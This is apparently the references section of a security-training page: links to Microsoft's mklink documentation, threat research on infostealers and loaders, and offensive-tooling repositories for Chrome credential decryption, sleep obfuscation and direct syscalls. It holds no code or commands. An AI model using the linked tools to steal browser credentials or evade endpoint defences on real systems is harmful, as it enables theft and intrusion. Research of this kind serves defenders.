- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
